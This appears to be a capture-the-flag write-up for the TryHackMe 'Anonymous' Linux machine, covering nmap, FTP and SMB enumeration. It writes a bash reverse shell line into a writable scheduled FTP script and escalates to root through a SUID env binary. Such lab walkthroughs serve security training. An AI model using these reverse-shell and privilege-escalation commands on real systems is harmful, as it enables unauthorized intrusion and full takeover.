---
title: "Tryhackme Anonymous Write-up"
date: 2021-02-15 16.40 
categories: [Tryhackme, Linux]
tags: [ftp, suid, privesc]
author: CEngover
image: /assets/img/posts/anonymous.png
---

Hello, in this article we're going to solve `Anonymous` which is linux based machine from [Tryhackme](https://tryhackme.com/). Let's describe solution steps first and then get into the solution.

### Reconnaissance

- Nmap scanning
- FTP enumeration
- SMB enumeration

### Exploitation

- Writing to a writeable ftp file 
- Getting reverse shell

## Privilege Escalation

- Finding SUID Binaries
- Abuse of env SUID bit

## Reconnaissance

### Nmap Scanning

Let's start with nmap scanning as described above.

> sudo nmap -sC -sV -oA nmap/anonymous-open-ports 10.10.25.138

Once we running nmap by given command, we get a result like the following.

```bash
# Nmap 7.80 scan initiated Mon Feb 15 09:12:05 2021 as: nmap -sC -sV -oA nmap/anonymous-ports -v -Pn 10.10.25.138
Increasing send delay for 10.10.25.138 from 0 to 5 due to 11 out of 11 dropped probes since last increase.
Nmap scan report for 10.10.25.138
Host is up (0.077s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.17.122
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)
|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)
|_  256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   ANONYMOUS<00>        Flags: <unique><active>
|   ANONYMOUS<03>        Flags: <unique><active>
|   ANONYMOUS<20>        Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|_  WORKGROUP<1e>        Flags: <group><active>
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: anonymous
|   NetBIOS computer name: ANONYMOUS\x00
|   Domain name: \x00
|   FQDN: anonymous
|_  System time: 2021-02-15T14:13:41+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-02-15T14:13:41
|_  start_date: N/A

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Feb 15 09:13:43 2021 -- 1 IP address (1 host up) scanned in 97.41 seconds

```

### FTP Enumeration

According to the result of nmap, we have 4 open ports. FTP is running on port 21, SSH is running on port 22 and SMB is running on port 139,445. We can notice that FTP anonymous login is allowed from nmap result. If we try to log in ftp server with anonymous and anonymous credentials, we'll get a successfull login. 

![FTP Login](/assets/img/posts/anonymous/ftp_login.png)

We see that there is a directory called scripts and this directory has 3 different file. The contents of the files are as follows.

`cleans.sh`
```bash
#!/bin/bash
tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
```

`removed_files.log`
```bash
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
```

`to_do.txt`
```bash
I really need to disable the anonymous login...it's really not safe
```

As can be seen from the picture, we have write and execute privileges on clean.sh.

### SMB Enumeration

We can use the smbclient tool to list shared folders in SMB. 

> smbclient -L \\\\10.10.25.138\\

After running the command we see that there is shared folder named `pics`. We can log in to the smb server with the use of null authentication in SMB. 

> smbclient \\\\10.10.25.138\\pics -U ''

When we log in to smb, we see that there are 2 dog pictures.

![Dog 1](/assets/img/posts/anonymous/corgo2.jpg)
![Dog 2](/assets/img/posts/anonymous/puppos.jpeg)

`When I saw these pictures, thought that there could be steganography stuff but I had wrong.`

## Exploitation

Since there is no other service back to gather information, our next process will be exploitation. Now, we've only cleans.sh which is a scheduled task.

### Writing to clean.sh file

It runs for about 1-2 minutes and is written to remove_files.log file. If we put our malicious code into clean.sh, we can access to the system. Our code will be like this;

```bash
#!/bin/bash
bash -i >& /dev/tcp/10.9.17.122/1337 0>&1
tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
```

### Getting Reverse Shell

![Clean bash file](/assets/img/posts/anonymous/ftp_clean.png)

We replace the clean.sh file with ours. When clean.sh file run again, our code will be run and we get a shell.

![Getting Shell](/assets/img/posts/anonymous/shell.png)

## Privilege Escalation

Now, we need more privileges. `I checked that if there is an any command that we can run with sudo rights but there's nothing.` 

### Abuse of env SUID bit

![Linpeas](/assets/img/posts/anonymous/linpeas.png)

My next step was to check the SUID bits and there is an interesting SUID bit which is `env`.

if we use this SUID bit like this;

> env /bin/sh -p

![Becoming Root](/assets/img/posts/anonymous/root.png)

We escalate our privilege to root.